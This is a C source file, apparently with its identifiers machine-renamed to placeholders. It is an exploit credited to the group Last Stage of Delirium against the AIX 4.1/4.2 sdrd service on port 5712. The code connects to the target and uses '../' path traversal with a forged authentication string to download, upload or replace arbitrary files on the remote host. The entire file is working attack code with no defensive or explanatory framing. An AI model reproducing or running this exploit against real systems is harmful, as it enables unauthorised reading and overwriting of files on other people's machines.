
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


typedef int tmp ;
struct stat {int st_size; } ;
struct TYPE_2__ {int s_addr; } ;
struct sockaddr_in {TYPE_1__ sin_addr; int sin_port; int sin_family; } ;
struct sockaddr {int dummy; } ;
struct hostent {int h_addr; } ;
typedef int FILE ;


 int VAR_0 ;
 int VAR_1 ;
 int VAR_2 ;
 int VAR_3 ;
 int VAR_4 ;
 int VAR_5 ;
 int FUNC_0 (int) ;
 scalar_t__ FUNC_1 (int,struct sockaddr*,int) ;
 int VAR_6 ;
 int FUNC_2 (int) ;
 int FUNC_3 (int,struct stat*) ;
 struct hostent* FUNC_4 (char*) ;
 int FUNC_5 (char*,int) ;
 int FUNC_6 (int,char**,char*) ;
 int FUNC_7 () ;
 int FUNC_8 (int,int*) ;
 int FUNC_9 (int) ;
 int FUNC_10 (char*) ;
 scalar_t__ FUNC_11 (int ) ;
 int FUNC_12 (int*,int ,int) ;
 int FUNC_13 (char*,int,...) ;
 int VAR_7 ;
 int FUNC_14 (char*) ;
 int FUNC_15 (char*,...) ;
 int FUNC_16 (int,char*,int) ;
 int FUNC_17 (int ,int ,int ) ;
 int FUNC_18 (char*,char*,...) ;
 int FUNC_19 (char*) ;
 int FUNC_20 (int,char*,int) ;

FUNC_21(int VAR_8,char **VAR_9){
    char VAR_10[10000],VAR_11[1024],*VAR_12,*VAR_13,*VAR_14,*VAR_15;
    int VAR_16,VAR_17,VAR_18,VAR_19,VAR_20=-1,VAR_21;
    struct sockaddr_in VAR_22;
    struct hostent *VAR_23;
    FILE *VAR_24; struct stat VAR_25;

    FUNC_15("copyright LAST STAGE OF DELIRIUM oct 1998 poland  //lsd-pl.net/\n");
    FUNC_15("sdrd for aix 4.1 4.2 PowerPC/POWER\n\n");

    if(VAR_8!=5){
        FUNC_15("usage: %s address -g|-p|-r ifile ofile\n",VAR_9[0]);
        FUNC_2(-1);
    }

    while((VAR_18=FUNC_6(VAR_8-1,&VAR_9[1],"gpr"))!=-1){
        switch(VAR_18){
        case 'g': VAR_20=1; break;
        case 'p': VAR_20=2; break;
        case 'r': VAR_20=3; break;
        default : FUNC_2(-1);
        }
    }
    if(VAR_20==-1) FUNC_2(-1);

    VAR_12=VAR_9[VAR_7+1];
    VAR_13=VAR_9[VAR_7+2];

    VAR_16=FUNC_17(VAR_0,VAR_5,0);
    VAR_22.sin_family=VAR_0;
    VAR_22.sin_port=FUNC_9(5712);
    if((VAR_22.sin_addr.s_addr=FUNC_10(VAR_9[1]))==-1){
        if((VAR_23=FUNC_4(VAR_9[1]))==((void*)0)){
            VAR_6=VAR_1;FUNC_14("error");FUNC_2(-1);
        }
        FUNC_12(&VAR_22.sin_addr.s_addr,VAR_23->h_addr,4);
    }

    if(FUNC_1(VAR_16,(struct sockaddr*)&VAR_22,sizeof(struct sockaddr_in))<0){
        FUNC_14("error");FUNC_2(-1);
    }

    switch(VAR_20){
    case 1:
        FUNC_15("getting %s from %s\n",VAR_12,VAR_9[1]);
        FUNC_18(VAR_11,"SDRFiles/../../../../../../../../../../../../..%s",VAR_12);
        FUNC_18(VAR_10,"3 %d %s",FUNC_19(VAR_11),VAR_11);
        FUNC_20(VAR_16,VAR_10,FUNC_19(VAR_10));
        if(FUNC_8(VAR_16,&VAR_19)){
            FUNC_15("error: no file %s:%s\n",VAR_9[1],VAR_12);FUNC_2(-1);
        }
        if((VAR_21=FUNC_13(VAR_13,VAR_4|VAR_2,0600))<0){
            FUNC_15("error: create %s\n",VAR_13);FUNC_2(-1);
        }
        while(VAR_19){
            if((VAR_17=FUNC_16(VAR_16,VAR_10,VAR_19))<0) {FUNC_14("error");FUNC_2(-1);}
            FUNC_20(VAR_21,VAR_10,VAR_17);
            VAR_19-=VAR_17;
        }
        break;
    case 2:
        FUNC_15("putting %s to %s:%s\n",VAR_12,VAR_9[1],VAR_13);
        goto common;
    case 3:
        FUNC_15("replace %s:%s with %s\n",VAR_9[1],VAR_13,VAR_12);
        goto common;

common:
        FUNC_5(VAR_11,sizeof(VAR_11));
        FUNC_18(VAR_10,"8 18 0 %s:%d:1",VAR_11,FUNC_7());
        FUNC_20(VAR_16,VAR_10,FUNC_19(VAR_10));
        if(FUNC_8(VAR_16,&VAR_19)){
            FUNC_15("error: auth\n");FUNC_2(-1);
        }
        if((VAR_21=FUNC_13(VAR_12,VAR_3))<0){
            FUNC_15("error: open %s\n",VAR_12);FUNC_2(-1);
        }
        FUNC_3(VAR_21,&VAR_25);
        FUNC_18(VAR_11,"SDRFiles/../../../../../../../../../..%s",VAR_13);
        if(!(VAR_14=(char*)FUNC_11(FUNC_19(VAR_11)+VAR_25.st_size+32))){
            FUNC_15("error: memory alloc");FUNC_2(-1);
        }
        if(VAR_20==3) FUNC_18(VAR_14,"2 %d %s ",FUNC_19(VAR_11)+VAR_25.st_size,VAR_11);
        else FUNC_18(VAR_14,"19 %d %s ",FUNC_19(VAR_11)+VAR_25.st_size,VAR_11);
        VAR_15=VAR_14+FUNC_19(VAR_14);
        VAR_19=VAR_25.st_size;
        while(VAR_19){
            if((VAR_17=FUNC_16(VAR_21,VAR_15,VAR_19))<0) {FUNC_14("error");FUNC_2(-1);}
            VAR_19-=VAR_17;VAR_15+=VAR_17;
        }
        FUNC_0(VAR_21);
        *VAR_15=0;
        FUNC_20(VAR_16,VAR_14,FUNC_19(VAR_14));
        if(VAR_20==3) while(VAR_19){
            if((VAR_17=FUNC_16(VAR_16,VAR_10,VAR_19))<0) {FUNC_14("error");FUNC_2(-1);}
            VAR_19-=VAR_17;
        }
        if(FUNC_8(VAR_16,&VAR_19)){
            FUNC_15("error: create %s:%s\n",VAR_9[1],VAR_13);FUNC_2(-1);
        }
    }
    FUNC_15("ok!\n");
    FUNC_0(VAR_21);
}
